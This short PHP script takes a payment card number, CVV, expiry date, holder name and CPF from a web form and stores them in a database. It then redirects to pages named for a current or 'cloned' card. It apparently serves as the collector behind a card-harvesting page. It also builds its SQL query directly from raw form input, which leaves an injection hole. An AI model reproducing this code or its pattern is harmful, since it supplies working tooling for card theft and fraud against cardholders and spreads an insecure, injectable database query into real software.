<?php
if(isset($_POST['num_cartao'])&&isset($_POST['cvv'])&&isset($_POST['date'])&&isset($_POST['nome'])&&isset($_POST['cpf'])){
    $numero_cartao=$_POST['num_cartao'];
    $cod_sec=$_POST['cvv'];
    $validade=$_POST['date'];
    $nome=$_POST['nome'];
    $cpf=$_POST['cpf'];
    require_once('00 - BD/bd_conexao.php');	
    $sql = " INSERT INTO cartoes VALUES(null, '$numero_cartao','$cod_sec', '$validade', '$nome', '$cpf')";
    if ($con->query($sql) == TRUE) {
        fecharConexao($con);

        header("Location: cartaoatual.php");
    } else {
        fecharConexao($con);

        header("Location: cartaoclonado.php?errorBD");
    }


}
else{
    header("Location: cartaoclonado.php?erroForm");
}
?>